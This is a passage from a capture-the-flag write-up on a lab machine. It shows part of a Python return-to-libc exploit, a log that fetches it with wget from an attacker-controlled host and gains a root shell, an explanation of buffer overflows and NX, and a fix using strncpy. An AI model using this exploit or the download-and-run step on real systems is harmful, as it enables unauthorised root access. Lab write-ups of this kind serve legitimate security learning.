# 0xb7e19000 + 0x0002e9d0
exit = struct.pack("<I", 0xb7e479d0)


padding = "\41" * 52

payload = padding+system+exit+shell

subprocess.call(["/home/ayush/.binary/rop", payload])
```


```
www-data@frolic:~/html$ wget 10.10.14.70:8000/explotest.py
--2021-02-04 09:16:47--  http://10.10.14.70:8000/explotest.py
Connecting to 10.10.14.70:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 397 [text/plain]
Saving to: 'exploit.py'

explotest.py        100%[===================>]     397  --.-KB/s    in 0s      

2021-02-04 09:16:47 (44.3 MB/s) - 'exploit.py'saved [397/397]

www-data@frolic:~/html$ python exploit.py
# whoami
root
# 

```

With a normal buffer overflow, you overflow the buffer with NOP sleds. NOP(No operation) is just a certain instruction to the program to do nothing at all. 0x90 is the NOP instruction for intel x86 CPUs.


The NOP sled will overwrite the return address of the function, and instead you add a payload after the NOP sled. The CPU will then read all the NOP instructions and then finally reach the payload. This is normally shellcode.

Executable space protection is a safety measure that attempts to block execution of core on certain memory regions. In this case it was NX.

So to circumvent this. We use a return to libc attack. Libc is just the standard library for C functions. So instead of using crafted shellcode, we use code the program itself has access to. And libc includes /bin/shell. That is why we looked for the addresses on the target computer.

So system() passes the command name or program name to the host environment to be executed and returns.

The exit() function terminates the calling process.

/bin/sh starts a shell.

A more thorough explanation can be found here: https://www.ret2rop.com/2018/08/return-to-libc.html and a video here: https://www.youtube.com/watch?v=FvQYGAM1X9U

In a normal BOF we do the padding, then the new return address, the NOP sled, and then finally shellcode.

In the ret2libc method, we do padding, the address of system(), the address of exit(), and then address for /bin/sh.

The reason we have the location of exit() before we pass the /bin/sh argument, is that when the program steps into a function. Like system(), the first thing that is saved on top of the stack is the return address. So we are setting the return address to the exit() function. This way we won't have any errors after running /bin/sh.

So we are overwriting the return address of the strcpy() function with the system() function, and then overwriting the return address of system() with the address of exit() and then passing /bin/sh as the system argument.




## Comparing myself to the official writeup:

It was pretty much the same. Maybe some different tools used.


## How to stop this exploit:
This was more like a ctf. Clues scattered around for us to find. 

However, there's an interesting thing about the BOF. It's only possible because it uses the strcpy() function, instead of the strncpy() function. The latter allows you to set a limit to how many characters can be copied. Therefore, you can make sure that the buffer wont overflow.



